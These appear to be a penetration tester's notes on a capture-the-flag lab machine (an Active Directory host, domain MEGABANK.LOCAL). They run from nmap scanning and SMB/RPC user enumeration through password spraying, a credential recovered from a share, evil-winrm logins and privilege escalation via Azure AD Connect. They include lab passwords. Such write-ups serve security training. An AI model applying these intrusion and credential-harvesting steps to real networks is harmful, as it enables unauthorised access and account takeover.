### Enumeration
```
IP=10.10.10.10
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p -A $IP
nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 53
	- DNS
- 88
	- kerberos
- 135
	- RPC
- 139
	- RPC
- 389
	- Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
- 445
	- smb
- 464
	- kpasswd5
- 593
	- RPC
- 636
	- tcpwrapped
- 3268
	- Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
- 3269
	- tcpwrapped
- 5985
	- winrm
- 9389
	- .NET Message Framing
- 47001
	- RPC
- 49152-49158
	- RPC
- 49169
	- RPC
- 49170
	- RPC
- 49179
	- RPC
### Foothold
- 21
	- ftp anonymous@$IP
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
- DNS
	- nslookup
		- server $IP
		- 127.0.0.1
	- dig @$IP domain
		- If domain resolves
			- dig axfr @$IP domain
- RPC/ SMB
	- enum4linux $IP
	- crackmapexec smb $IP -u guest -p "" --rid-brute
		- dgalanos
		- guest
		- roleary
		- SABatchJobs
		- smorgan
		- svc-ata
		- svc-bexec
		- svc-netapp
	- put into uers.txt
	- crackmapexec smb $IP -u "" -p "" --pass-pol
	- rpcclient -U '' $IP
		- enumdomusers
		- queryusergroups RID
		- queryuser RID
- 445
	- smbclient -N -L //$IP
		- anonymous login successful, no shares
	- nmap --script smb-vuln* -p135,139,445 $IP
- Brute force
	- crackmapexec smb 10.10.10.172 -u users -p users --continue-on-success
		- Username is the same as the Password
		- SABatchJobs:SABatchJobs success
- SABatchJobs
	- smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
		- READ: users$  SYSVOL  NETLOGON  IPC$  azure_uploads
	- Connect to smb: smbclient -U SABatchJobs //$IP/share
		- users$
			- azure.xml in mhope directory
				- Password: `4n0therD4y@n0th3r$
	- Spider share
		- smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'
			- mhope
				- azure.xml
				- evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
					- success

### PE
#### Windows
- mhope
	- whoami /all
	- Root drive directory
	- net user USERNAME
		- Check group memberships
			- Azure Admins
	- /Program Files
		- ls *Azure*
			- A few Azure AD connectors and sync
				- Exploit article: https://blog.xpnsec.com/azuread-connect-for-redteam/
				- Get admin creds after changing to 127.0.0.1
				- administrator:d0m@in4dminyeah!
- administrator
	- Connect:  evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
### Credentials
### Lessons Learned